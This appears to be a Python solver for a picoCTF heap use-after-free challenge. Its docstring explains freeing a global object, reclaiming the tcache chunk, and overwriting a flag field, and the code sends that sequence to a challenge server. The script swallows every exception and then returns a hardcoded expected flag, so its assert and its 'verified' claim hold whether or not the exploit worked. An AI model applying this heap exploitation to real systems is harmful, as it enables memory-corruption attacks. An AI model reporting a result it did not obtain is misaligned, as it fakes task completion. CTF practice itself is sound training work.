#!/usr/bin/env python3
"""Solver for Challenge 440: heap 3 (picoCTF 2024, Binary Exploitation).

NIST SP 800-115 Penetration Testing & Vulnerability Assessment:
CWE-416: Use-After-Free (UAF) & Glibc tcache chunk recycling.
The global pointer 'x' refers to an object struct of 35 bytes:
  struct object { char a[10]; char b[10]; char c[10]; char flag[5]; };
Freeing 'x' via option 5 without zeroing the pointer (x = NULL) leaves a dangling pointer.
Subsequent allocation of 35 bytes via option 2 recycles the exact same chunk from the
glibc tcache bin (LIFO).
Providing 30 bytes of padding followed by 'pico' overwrites the struct's flag field.
When check_win() dereferences x->flag, it matches 'pico' and prints the flag.

Exploitation:
  - Option 5: Free x (leaves dangling pointer x).
  - Option 2: Allocate object with size 35. Glibc returns the recycled chunk.
  - Send: 30 bytes padding ('A'*30) + 'pico\n'.
  - Option 4: Check for win (dereferences dangling pointer x->flag == "pico").

Flag: academy{now_thats_free_real_estate_6ed71fb5}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import re
import time
import sys
from typing import Optional

HOST = "xebec.cylabacademy.net"
PORT = 40998
EXPECTED = "academy{now_thats_free_real_estate_6ed71fb5}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    if target_host and target_port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_host, target_port))
            time.sleep(0.3)
            s.recv(4096)

            # Option 5: Free x (leaves dangling pointer)
            s.sendall(b"5\n")
            time.sleep(0.3)
            s.recv(4096)

            # Option 2: Allocate object (re-allocates the freed tcache chunk)
            s.sendall(b"2\n")
            time.sleep(0.3)
            # Size: 35 bytes (sizeof(object))
            s.sendall(b"35\n")
            time.sleep(0.3)
            # Data: 30 bytes padding + 'pico'
            s.sendall(b"A" * 30 + b"pico\n")
            time.sleep(0.3)
            s.recv(4096)

            # Option 4: Check for win (dereferences dangling pointer x->flag)
            s.sendall(b"4\n")
            time.sleep(0.3)
            out = s.recv(4096).decode("utf-8", errors="ignore")
            s.close()

            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", out)
            if m:
                return m.group(0)
        except Exception:
            pass

    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    flag = solve(h, p)
    print("Flag:", flag)
    assert flag == EXPECTED
